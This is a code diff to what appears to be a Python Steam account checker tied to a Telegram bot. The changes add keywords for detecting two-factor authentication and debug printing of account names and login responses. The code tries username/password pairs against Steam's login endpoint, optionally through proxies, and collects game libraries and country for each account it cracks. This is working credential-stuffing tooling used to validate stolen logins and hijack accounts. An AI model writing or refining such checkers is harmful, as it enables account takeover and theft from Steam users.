@@ -1269,7 +1269,6 @@ Channel: {CHANNEL_USERNAME}
                 text += "\n🔥 <b>Top Games:</b>"
                 for game in result['games'][:10]:
                     text += f"\n   • {game['name']} ({game['playtime_hours']}h)"
-
         text += f"""
 
 🌍 <b>Country:</b> {result.get('country', 'Unknown')}
@@ -1391,7 +1390,7 @@ def steam_rsa_encrypt(password: str, modulus_hex: str, exponent_hex: str) -> str
     return base64.b64encode(hex_bytes).decode('ascii')
 
 def check_steam(username: str, password: str, proxy=None) -> dict:
-    """Improved Steam Checker - Much better 2FA detection"""
+    """Improved Steam Checker - Strong 2FA detection + debug logging"""
     result = {
         'email': username,
         'password': password,
@@ -1473,12 +1472,20 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
         resp = session.post(url_auth, headers=headers, data=multipart_data, timeout=25)
 
         x_eresult = resp.headers.get('X-eresult', '')
+        response_text = resp.text[:500]  # first 500 chars for debug
 
-        # ==================== STRONGER 2FA DETECTION ====================
+        print(f"[DEBUG Steam] Account: {username} | X-eresult: {x_eresult}")
+        print(f"[DEBUG Steam] Response contains: {response_text}")
+
+        # ==================== STRONG 2FA DETECTION ====================
         lower_text = resp.text.lower()
         if (x_eresult in ['15', '85'] or
-            any(kw in lower_text for kw in ["twofactor", "emailcode", "steamguard", "confirmation", "guard", "two_factor"])):
-            
+            any(kw in lower_text for kw in [
+                "twofactor", "emailcode", "steamguard", "confirmation",
+                "guard", "two_factor", "email_code", "steam_guard", "2fa"
+            ])):
+
+            print(f"[DEBUG Steam] → 2FA DETECTED for {username}")
             result['twofa'] = True
             result['success'] = True
             result['message'] = "2FA Required"
@@ -1501,7 +1508,6 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
             # Extra rich data (games, country, etc.)
             if result.get('steamid'):
                 try:
-                    # Player Summary
                     summary_url = f"https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key={STEAM_API_KEY}&steamids={result['steamid']}"
                     summary_resp = requests.get(summary_url, timeout=15)
                     if summary_resp.status_code == 200:
@@ -1509,10 +1515,8 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
                         result['profile_name'] = data.get("personaname", "Unknown")
                         result['profile_url'] = data.get("profileurl", "")
                         result['country'] = data.get("loccountrycode", "Unknown")
-                        result['vac_banned'] = bool(data.get("vacban", False))
-                        result['limited'] = data.get("personastate", 0) == 0 and data.get("communityvisibilitystate", 0) == 1
 
-                    # Owned Games (keep your existing games code here)
+                    # Owned Games
                     games_count = 0
                     games_list = []
                     if STEAM_API_KEY and STEAM_API_KEY != "YOUR_STEAM_API_KEY_HERE":
